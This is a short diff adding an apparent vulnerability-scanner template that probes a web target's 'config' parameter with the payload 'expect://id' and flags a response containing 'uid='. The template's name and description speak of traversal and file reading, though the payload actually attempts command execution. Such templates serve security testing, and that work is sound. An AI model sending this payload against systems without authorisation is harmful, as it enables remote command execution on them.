@@ -1,0 +1,20 @@
+id: lfi6-0998
+name: 'Traversal in config'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via config'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      config:
+        - 'expect://id'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
